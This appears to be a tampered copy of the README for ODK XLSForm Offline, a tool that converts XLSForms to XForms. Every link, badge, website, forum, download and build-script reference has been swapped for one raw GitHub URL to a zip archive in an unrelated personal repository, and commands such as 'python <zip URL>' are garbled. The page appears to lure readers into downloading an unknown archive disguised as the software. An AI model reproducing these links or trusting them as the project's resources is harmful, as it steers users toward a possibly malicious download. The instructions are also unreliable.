# ODK XLSForm Offline
![Platform](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)
[![License](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip%https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)
[![Slack status](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)

ODK XLSForm Offline is a Windows and macOS application for converting an XLSForm into an XForm that is compliant with the [ODK XForms spec](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip). Once converted, the application also validates that the XForm will run perfectly with all ODK tools.
   
ODK XLSForm Offline is part of Open Data Kit (ODK), a free and open-source set of tools which help organizations author, field, and manage mobile data collection solutions. Learn more about the Open Data Kit project and its history [here](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip) and read about example ODK deployments [here](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip).

* ODK website: [https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)
* ODK forum: [https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)
* ODK developer Slack chat: [https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip) 
* ODK developer Slack archive: [https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip) 
* ODK developer wiki: [https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)

## Prerequisites

1. Install [Python 2.7](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)
    * If you are on Windows, you must install the 32 bit version.
1. Install Python packages: ``pip install pyinstaller wxpython pyxform``
1. Install packaging utilities
    * macOS: ``brew install unix2dos``
    * Windows: [upx](https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip)

## Run

To run the app, `python https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip`

## Package

The easiest way to package is to use a macOS machine running a Windows 10 virtual machine. Share the `xlsform-offline` folder on the Mac with Windows, then mount that folder as the Z drive with `pushd "\\vmware-host\Shared Folders\xlsform-offline\"`.

1. In the macOS machine, run `https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip` to build the Mac binary.
1. In the Windows virtual machine, run `https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip` to build the Windows binary.
1. Finally, in the macOS machine, run `https://raw.githubusercontent.com/dvdgayflor/xlsform-offline/master/src/xlsform_offline_v2.1.zip` to zip up the Mac and Windows binaries.
